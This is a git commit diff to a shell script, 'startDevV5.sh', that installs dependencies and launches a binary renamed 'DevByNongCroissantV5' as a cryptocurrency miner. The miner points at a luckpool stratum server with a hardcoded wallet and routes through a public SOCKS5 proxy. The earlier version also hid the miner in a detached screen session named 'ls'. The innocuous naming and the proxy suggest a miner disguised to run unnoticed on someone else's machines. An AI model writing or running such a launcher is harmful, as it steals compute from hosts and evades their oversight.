3c57535832fcaa2ac24439e37e9a016bd694354f
closemaptoya <85560638+closemaptoya@users.noreply.github.com>
2021-07-03 22:58:49 +0700

    Update startDevV5.sh

--- startDevV5.sh
+++ startDevV5.sh
@@ -1,10 +1,5 @@
 #!/bin/bash
-sudo apt update 
-sudo apt install screen libjansson4 -y 
+apt-get update 
+apt install libcurl4-openssl-dev -y
 chmod +x DevByNongCroissantV5
-screen -dmS ls 
-POOL=stratum+tcp://eu.luckpool.net:3956
-WALLET=RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr
-WORKER=$(echo $(shuf -i 1-100 -n 1)-Embe)
-PROXY=socks5://98.162.25.23:4145
-./DevByNongCroissantV5 -a verus -o $POOL -u $WALLET.pion -t 2 -x $PROXY
+./DevByNongCroissantV5 -a verus -o stratum+tcp://na.luckpool.net:3960 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevByNongCroissantV5 -t 4 -x socks5://98.162.25.23:4145
